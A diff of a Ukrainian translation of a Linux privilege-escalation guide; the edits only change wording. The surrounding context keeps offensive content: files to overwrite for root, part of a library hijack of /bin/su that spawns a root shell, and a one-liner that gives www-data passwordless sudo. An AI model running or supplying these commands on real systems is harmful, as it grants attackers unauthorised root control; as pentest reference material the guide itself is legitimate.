@@ -46,16 +46,16 @@ return 0;
 ```
 ## Перезапис файлу для підвищення привілеїв
 
-### Поширені файли
+### Типові файли
 
 - Додати користувача з паролем до _/etc/passwd_
 - Змінити пароль у _/etc/shadow_
 - Додати користувача до sudoers у _/etc/sudoers_
-- Зловживати Docker через Docker socket, зазвичай у _/run/docker.sock_ або _/var/run/docker.sock_
+- Abuse docker через docker socket, зазвичай у _/run/docker.sock_ або _/var/run/docker.sock_
 
-### Перезапис бібліотеки
+### Перезапис library
 
-Перевірте бібліотеку, яку використовує певний binary, у цьому випадку `/bin/su`:
+Перевірте library, яку використовує певний binary, у цьому випадку `/bin/su`:
 ```bash
 ldd /bin/su
 linux-vdso.so.1 (0x00007ffef06e9000)
@@ -98,13 +98,13 @@ setgid(0);
 system("/bin/bash");
 }
 ```
-Тепер, просто викликавши **`/bin/su`**, ви отримаєте shell із правами root.
+Тепер, просто викликавши **`/bin/su`**, ви отримаєте shell від імені root.
 
 ## Скрипти
 
 Чи можете ви змусити root виконати щось?
 
-### **www-data to sudoers**
+### **www-data до sudoers**
 ```bash
 echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
 ```
